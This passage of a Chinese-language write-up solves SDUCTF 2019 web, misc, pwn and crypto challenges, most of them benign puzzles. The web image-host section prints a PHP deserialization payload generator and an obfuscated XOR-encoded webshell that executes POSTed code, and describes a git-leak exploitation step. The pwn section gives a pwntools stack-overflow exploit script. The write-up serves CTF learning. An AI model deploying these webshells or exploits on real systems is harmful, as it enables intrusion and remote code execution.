Firefox/71.0"</span>,</span><br><span class="line">4<span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">4<span class="string">"Cookie"</span>:pd,</span><br><span class="line">4<span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">4<span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span></span><br><span class="line">4&#125;</span><br><span class="line">4data = &#123;<span class="string">"second"</span>:ans&#125;</span><br><span class="line">4print(header)</span><br><span class="line">4r4 =requests.post(url,headers=header,data=data)</span><br><span class="line">4print(r4)</span><br><span class="line">4print(r4.text)<span class="comment">#flag</span></span><br><span class="line">4<span class="keyword">return</span> r4</span><br><span class="line">4</span><br><span class="line">aa = qa()</span><br><span class="line"><span class="comment">#print(aa)</span></span><br></pre></td></tr></table></figure><p>跑出来结果如下，得到flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web21-4.jpg" alt></p><h3 id="0x15-信息泄露"><a href="#0x15-信息泄露" class="headerlink" title="0x15 信息泄露"></a>0x15 信息泄露</h3><blockquote><p>题目描述： 信息泄露了，快拿到它 </p></blockquote><p>猜是php+Git泄露，参考如下文章，访问<code>http://url/.git/HEAD</code>，果然下载了HEAD文件</p><p>文件里写着：<code>ref: refs/heads/master</code>，按如下文章提取了访问<code>url/refs/heads/master</code>，提取了master里的文件：<code>985e6ce910e4cffa9957cf88fd9ac28c13654d6c</code></p><blockquote><p> <a href="https://www.jianshu.com/p/0ea09975169d" target="_blank" rel="noopener">https://www.jianshu.com/p/0ea09975169d</a> </p><p><a href="https://www.cnblogs.com/xhds/p/10884647.html" target="_blank" rel="noopener">https://www.cnblogs.com/xhds/p/10884647.html</a> </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web23-2.jpg" alt></p><p>然后发现GitHack一波就得到flag了emmmmmmmm</p><h3 id="0x16-web图床"><a href="#0x16-web图床" class="headerlink" title="0x16 web图床"></a>0x16 web图床</h3><blockquote><p>题目描述： 图床开发中，先放出来给你们玩一下 </p></blockquote><p>进入发现是一个登陆网页，想要注入却是登陆失败，那就注册一个试试</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web24-7.jpg" alt></p><p>注册后登陆进去，是一个可以上传图片的网页，其他啥东西也没有，推测是用图片做一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copya.png/b+<span class="number">1.</span>php  t.png</span><br></pre></td></tr></table></figure><p>但是发现上传上去之后返回的是就是图片，改后缀也无法访问其php文件</p><p>于是尝试了各种图片一句话木马的可能，比如截断，抓包改后缀，发现服务器只接受图片文件，而且无论是什么格式的图片会被改成png格式进行呈现，而且不能上传其他格式的文件。</p><p>其中中间网页貌似崩了一下，看到是ThinkPHP V5.1 ，百度搜其漏洞，发现也没法实现</p><p>其展示的后面解md5得到是172.2.0.2，想着内网地址也没得访问，后面跟着也是文件的MD5值<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Index of /upload/fd40c7f4125a9b9ff1a4e75d<span class="number">293e3080</span>/</span><br><span class="line">MD<span class="number">5(172.2.0</span>.<span class="number">2</span>) = fd40c7f4125a9b9ff1a4e75d<span class="number">293e3080</span></span><br></pre></td></tr></table></figure></p><p>抓包看Cookie解析之后，想改Cookie其中的文件后缀也没用。</p><p>后面实在没思路了，就打算对网站进行一波路径扫描，结果发现了惊喜，有一个<code>www.tar.gz</code>，访问下载文件，发现就是php源码了。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web24.jpg" alt></p><p>不过我还没到能完全审计php源码的高度，我就将其中一部分的源码取用百度搜索，果然搜到了原题</p><blockquote><p><a href="https://www.freebuf.com/column/205789.html" target="_blank" rel="noopener">https://www.freebuf.com/column/205789.html</a> </p><p><a href="https://blog.csdn.net/qq_26406447/article/details/90671853" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/90671853</a> </p><p> <a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a> </p></blockquote><p>通过PHP反序列化，得到cookie去使文件转化时，解析成php。</p><p>php发序列号程序如下，用生成的结果替换已有的Cookie即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$profile = <span class="keyword">new</span> Profile();</span><br><span class="line">$profile-&gt;except = [<span class="string">'index'</span> =&gt; <span class="string">'img'</span>];</span><br><span class="line">$profile-&gt;img = <span class="string">"upload_img"</span>;</span><br><span class="line">$profile-&gt;ext = <span class="string">"png"</span>;</span><br><span class="line">$profile-&gt;filename_tmp = <span class="string">"../public/upload/md5(user)/md5(filename).png"</span>;</span><br><span class="line">$profile-&gt;filename = <span class="string">"../public/upload/md5(user)/xxx.php"</span>;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register();</span><br><span class="line">$register-&gt;registed = <span class="keyword">false</span>;</span><br><span class="line">$register-&gt;checker = $profile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure><p>不过复现时也遇到了不少麻烦，通过以下代码构造payload然后去替代我们的Cookie，刷新后得到我们修改后缀的php图片马。</p><p>不过在用户已登录时改Cookie时没用，要等到退出账户到登陆界面时设置新建Cookie，再刷新得到如下界面说明成功了</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web24-8.png" alt></p><p>此时，去访问<code>url/upload/</code>即可看到我们修改的php后缀的文件，同时在上传做php图片马时也遇到了问题</p><p>以下是中国蚁剑生成的免杀马，和png图片拼接在一起上传后发现无法解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISGM</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MaRC</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $XYUg = <span class="string">"\xf9"</span> ^ <span class="string">"\x98"</span>;</span><br><span class="line">        $LaqL = <span class="string">"\x57"</span> ^ <span class="string">"\x24"</span>;</span><br><span class="line">        $LXlg = <span class="string">"\xe0"</span> ^ <span class="string">"\x93"</span>;</span><br><span class="line">        $kYoS = <span class="string">"\x7a"</span> ^ <span class="string">"\x1f"</span>;</span><br><span class="line">        $zzTF = <span class="string">"\xaf"</span> ^ <span class="string">"\xdd"</span>;</span><br><span class="line">        $hteZ = <span class="string">"\x9f"</span> ^ <span class="string">"\xeb"</span>;</span><br><span class="line">        $DBlL =$XYUg.$LaqL.$LXlg.$kYoS.$zzTF.$hteZ;</span><br><span class="line">        <span class="keyword">return</span> $DBlL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $LlRV=<span class="keyword">$this</span>-&gt;MaRC();</span><br><span class="line">        @$LlRV(<span class="keyword">$this</span>-&gt;So);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$isgm = <span class="keyword">new</span> ISGM();</span><br><span class="line">@$isgm-&gt;So = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])?base64_decode($_POST[<span class="string">'pass'</span>]):$_POST[<span class="string">'pass'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后尝试自己写了一个，拼接在一起也没有躲开这个错误的厄运</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web24-3.jpg" alt></p><p>查看图片马的源码发现如下：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web24-9.jpg" alt></p><p>可能是png文件尾和php头部拼接，导致一些转义问题，php失去头部<code>&lt;?php</code>导致解析php解析失败</p><p>然后尝试用jpg文件去做一个图片马、上传，果然成功了</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web24-2.jpg" alt></p><p>然后用中国蚁剑连上服务器，在根目录下找到flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web24-6.jpg" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\web24-5.jpg" alt></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><center>Misc</center></h2><h3 id="0x01-Gif"><a href="#0x01-Gif" class="headerlink" title="0x01 Gif"></a>0x01 Gif</h3><blockquote><p>题目描述： Gif你眼神够快吗？ </p></blockquote><p>用StegSolve.jar 打开目标gif，即可逐帧查看，一共六帧，4帧都是flag需要自己拼接。</p><p>拼接完得到flag<code>SDUCTF{Gif_is_very_interesting}</code></p><h3 id="0x02-PDF"><a href="#0x02-PDF" class="headerlink" title="0x02 PDF"></a>0x02 PDF</h3><blockquote><p>题目描述： pdf里面藏了啥？ </p></blockquote><p>跟攻防世界的一题misc一样，随便找个网站将pdf转doc，然后把图片拖开flag就藏在下面。</p><p>或者用一些pdf编辑器也做的到。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\misc2.jpg" alt></p><h3 id="0x03-今晚月色美吗"><a href="#0x03-今晚月色美吗" class="headerlink" title="0x03 今晚月色美吗"></a>0x03 今晚月色美吗</h3><blockquote><p>题目描述： 小王同学在路上走路，突然发现小朱同学发了一条朋友圈，配图是美美的月亮。于是小王同学心血来潮，掏出手机也拍了一张照片。你觉得月亮有什么奇怪的地方吗？ </p></blockquote><p>用StegSolve查看，原以为是加密，，没想到是藏在不同色差层。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\misc3.jpg" alt></p><h3 id="0x04-聋子听声音"><a href="#0x04-聋子听声音" class="headerlink" title="0x04 聋子听声音"></a>0x04 聋子听声音</h3><blockquote><p>题目描述：</p></blockquote><p>我这边用的是Audacity，据说AU也可以查看，根据题目描述，音频应该不是隐写，而是藏在频谱图里</p><p>查看频谱图就可得flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\misc4.jpg" alt></p><h3 id="0x05-二进制"><a href="#0x05-二进制" class="headerlink" title="0x05 二进制"></a>0x05 二进制</h3><blockquote><p> 题目描述：看二进制你能看出个什么花样来？ </p></blockquote><p>原本没有思路的，将文件扔进binwalk和foremost跑没跑出东西，用<code>less</code>，<code>more</code>没跑出来，最后自暴自弃用<code>cat</code>一试，flag就出来了，我还以为有什么隐写emmmmmmmmmm</p><p>结果是一堆0加上flag</p><p>另一种办法，用010editor打开，直接搜索flag，得到flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\misc5.jpg" alt></p><h3 id="0x06-奇怪的压缩文件"><a href="#0x06-奇怪的压缩文件" class="headerlink" title="0x06 奇怪的压缩文件"></a>0x06 奇怪的压缩文件</h3><blockquote><p>题目描述： eva说她给tom发了一张二维码，但是Tom接收文件后觉得不太对劲。 </p></blockquote><p>打开附件PIC.zip，发现里面有四个压缩文件，发现解压不了。扔binwalk跑一波发现是jpeg，直接改后缀得到jpg图片。</p><p>四个压缩文件分别是QRcode四等分，用画图把他们拼一起，获得一张完整的二维码，扫码得到flag。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\misc6.jpg" alt></p><h3 id="0x07-zip"><a href="#0x07-zip" class="headerlink" title="0x07 zip"></a>0x07 zip</h3><blockquote><p>题目描述： 这是一个加密的压缩包，你能打开它吗？ </p></blockquote><p><del>发现没有截图，就说下思路把</del>，转手就去把图截了，显示一个password.zip伪加密，用ZipCenOp解开伪加密，看到里面还有一个压缩包</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\misc7.jpg" alt></p><p>但是压缩包里面是一个图片文件，写着flag不在这</p><p>于是就把里面那个zip拖进010editor查看，发现是隐写一个压缩包，直接看到flag，复制提交就完了</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\misc7-2.jpg" alt></p><h3 id="0x08-猜拳"><a href="#0x08-猜拳" class="headerlink" title="0x08 猜拳"></a>0x08 猜拳</h3><blockquote><p>题目描述： 猜拳，你能赢过机器人吗？ </p></blockquote><p>又是没有思路的pwn，上网搜索得知python有个pwn库可以计算随机数种子，既然是猜，我就自己找一波规律。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\pwn2-sjb.jpg" alt></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">robot:</span> <span class="keyword">bsj </span>sjb <span class="keyword">jbs</span></span><br><span class="line"><span class="keyword">I </span>can win: <span class="keyword">jbs </span><span class="keyword">bsj </span>sjb</span><br></pre></td></tr></table></figure><p>找规律得知对面出拳是一个循环，自己手动解一波得到flag</p><p>(竟然改成Misc了，果然不是一道pwn题)</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a><center>PWN</center></h2><h3 id="0x01-Simple-nc"><a href="#0x01-Simple-nc" class="headerlink" title="0x01 Simple nc"></a>0x01 Simple nc</h3><blockquote><p>题目描述： 你会使用nc命令吗?<br>                    可能是全球最简单的pwn题目 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\pwn1.jpg" alt></p><p>虽然pwn还没入门，不过这确实是最简单得pwn。</p><p>熟悉nc即netcat命令即可，<code>netcat ctf.sec.sdunet.cn 38849</code>直接连上通过<code>ls,cat</code>命令读取flag</p><h3 id="0x02-StackOverflow"><a href="#0x02-StackOverflow" class="headerlink" title="0x02 StackOverflow"></a>0x02 StackOverflow</h3><blockquote><p>题目描述： 作为程序员怎么会不知道 <a href="https://stackoverflow.com/" target="_blank" rel="noopener">https://stackoverflow.com/</a> </p></blockquote><p>一道基本的栈溢出题目，但是中间的编码问题令人烦躁</p><p>用IDA逆向，看到主函数。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\pwn3-3.jpg" alt></p><p>进入hello()函数可以看到如下：其中有get函数</p><p>根据<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/" target="_blank" rel="noopener">ctf-wiki</a>的pwn的基本教程的get栈溢出就可以做出来</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\pwn3-4.jpg" alt></p><p>还在其中找到success，这应该就是我们getshell的函数</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\pwn3-2.jpg" alt></p><p>根据ctf-wiki构造exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"ctf.sec.sdunet.cn"</span>,<span class="string">"38268"</span>)</span><br><span class="line"><span class="comment">#sh = process(./stackoverflow)</span></span><br><span class="line">success_addr=<span class="number">0x08048486</span></span><br><span class="line"><span class="comment">#payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + <span class="string">'\x86\x84\x04\x08'</span></span><br><span class="line">print(p32(success_addr)</span><br><span class="line"><span class="comment">#out&gt;&gt;&gt;b'\x86\x84\x04\x08'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>用pwntools直接构造exp，getshell，获得flag</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\pwn3.jpg" alt></p><p>其中遇到了一个编码问题：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\pwn3-5.jpg" alt></p><p>因为地址用p32转成地址形式为<code>b&#39;\x86\x84\x04\x08</code>所以一直编码不成功，导致payload连接失败不能成功getshell</p><p>在decode时使用<code>&#39;ignore&#39;</code>模式，<code>\x86\x84</code>两个字符会被忽略，说明是非法字符。</p><p><strong>不懂是啥错误！！</strong></p><p>pwn自带的flat方法可以拼接字符串避开str连接的错误，flat方法传入一个列表<code>list[]</code>，list里放所需要拼接的对象 ： <code>payload = flat([&#39;a&#39;*24,&#39;bbbb&#39;,addr])</code></p><p>还有执行elf文件，由于我的系统是64bitUbuntu，执行32bitELF文件需要安装以下包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lib32ncurses5 lib32z1</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><center>Crypto</center></h2><h3 id="0x01-Base"><a href="#0x01-Base" class="headerlink" title="0x01 Base"></a>0x01 Base</h3><blockquote><p>题目描述：[<a href="https://baike.baidu.com/item/贝斯/]" target="_blank" rel="noopener">https://baike.baidu.com/item/贝斯/]</a></p><p><a href="https://www.google.com/search?q=ZmxhZ3tiYXNlNjRfaXNfbm90X2FuX2VuY3J5cHRpb25fbWV0aG9kfQ" target="_blank" rel="noopener">奇怪的链接</a></p></blockquote><p>题目直接给了两个链接，不过第二个如下</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ<span class="number">3</span>tiYX<span class="symbol">NlNjRfaXNfbm90</span>X<span class="number">2</span>FuX<span class="number">2</span>VuY<span class="number">3</span>J<span class="number">5</span>cHRpb<span class="number">25</span>fbWV<span class="number">0</span>a<span class="name">G9</span>kfQ</span><br></pre></td></tr></table></figure><p>直接扔base64去解码，得到flag：<code>flag{base64_is_not_an_encryption_method}</code></p><h3 id="0x02-诡异的数字"><a href="#0x02-诡异的数字" class="headerlink" title="0x02 诡异的数字"></a>0x02 诡异的数字</h3><blockquote><p>题目描述：摩同学做ctf到深夜，点开这道题却发现网安实验室里的灯突然有规律的时暗时亮，十分诡异。难道这代表着什么？<br>他用颤抖的双手记下了下面这段文字。你能发现其中的奥秘吗？<br>11 111 010 000 0 11111 00 000 11111<br>00 10 1 0 010 0 000 1 00 10 110</p><p>flag格式为sductf{xxxxxxxxxx}</p></blockquote><p>既然是摩同学，那么直接放莫斯解码即可，字符串利用python脚本的<code>str.replae()</code>方法替换成<code>.-</code>即可，即1对应<code>-</code>，2对应<code>.</code>，解得flag。</p><h3 id="0x03-九宫格"><a href="#0x03-九宫格" class="headerlink" title="0x03 九宫格"></a>0x03 九宫格</h3><blockquote><p>题目描述：无论是搜狗输入法还是百度输入法还是QQ输入法还是讯飞输入法还是谷歌输入法还是……….都有9宫格，所以这个题目炒鸡简单</p><p>7426366432983<br>解出来的明文赋值给x</p><p>flag为 flag{ md5(x+md5(x,16), 32) }<br>(结果没有空格，x+ 表示的是x与另一个字符串进行拼接）</p></blockquote><p>一串数字通过经典的九宫格打出来是<code>山东大学</code>四个字</p><p>然后通过python的<code>hashlib.md5()</code>就可以算出flag</p><p>md5的16位百度得知是截取32位md5中间的16位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">s = <span class="string">"山东大学"</span></span><br><span class="line">mobj = hashlib.md5(s.encode(<span class="string">'utf-8'</span>)).hexdigest()[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line">ans = hashlib.md5(str(s+mobj).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"山东大学"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mobj = hashlib.md5(s.encode(<span class="string">'utf-8'</span>)).hexdigest()[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mobj</span><br><span class="line"><span class="string">'f09383b061bb3c9f'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = hashlib.md5(str(s+mobj).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="string">'ecf506190946c4e8d06d53e14191329e'</span></span><br></pre></td></tr></table></figure><h3 id="0x04-键盘追踪"><a href="#0x04-键盘追踪" class="headerlink" title="0x04 键盘追踪"></a>0x04 键盘追踪</h3><blockquote><p>题目描述：键盘是个画板，如果你的键盘有灯光应该会简单点</p><p>rfsdsz tfvbhy ijnm ijnm tfvbhy wsxdcft vgyhujm hjuygbn</p><p>还原出明文后请自行拼接flag{}</p></blockquote><p>之前在成都大学的ctf比赛中看过键盘密码，看题目描述应该是按键盘位置画出字母来，但是我比划出<code>olloWMe</code>后七个字母，硬是没看懂第一个字符是啥，然后将那些字符扔去百度，搜索得到的时<code>FollowMe</code>，尝试一波，果然是flag。</p><p>（至今为止我都不知道第一个为啥时F</p><h3 id="0x05-宇宙终极问题"><a href="#0x05-宇宙终极问题" class="headerlink" title="0x05 宇宙终极问题"></a>0x05 宇宙终极问题</h3><blockquote><p>题目描述：Do you know The Answer to the Ultimate Question of Life, The Universe, and Everything?</p><p>Give me 3 integers, x, y, and z, such that <strong>x^3 + y^3 + z^3 = 42</strong></p><p>得到x、y、z后请把它们乘起来，然后包裹上flag{}</p></blockquote><p>直接百度得到解如下，扔进python跑一波大数乘法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = <span class="number">-80538738812075974</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y = <span class="number">80435758145817515</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>z = <span class="number">12602123297335631</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x**<span class="number">3</span>+y**<span class="number">3</span>+z**<span class="number">3</span></span><br><span class="line"><span class="number">42</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x*y*z</span><br><span class="line"><span class="number">-81639006040518590050493906720365515701570561538910</span></span><br></pre></td></tr></table></figure><h3 id="0x06-秘密报文"><a href="#0x06-秘密报文" class="headerlink" title="0x06 秘密报文"></a>0x06 秘密报文</h3><blockquote><p>题目描述：在第一次世界大战期间，法国陆军捕获到一份秘密报文，交给中尉Georges Painvin尝试破解。</p><p>报文内容如下：<br>XX DF GG AF XD XF AF XD XF AF AG DD AF GF DX XF XD</p><p>解密之后请自行拼接flag{}提交</p></blockquote><p>我记得之前做题时有看见过类似密码，但是忘了是啥。</p><p>最明显的，先把中尉名字<code>Georges Painvin</code>百度一波，得知时<code>ADFGVX密码</code>对照密码表，解得flag：<code>flag{youarearealhacker}</code></p><p><img src="https://magic-king.net/images/loading.gif" data-original="SDUCTF2019-wp\crypto6.jpg" alt="图源自百度百科"></p><h3 id="0x07-ok"><a href="#0x07-ok" class="headerlink" title="0x07 ok?"></a>0x07 ok?</h3><blockquote><p>题目描述：</p><p>就问你ok不ok</p><p>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! 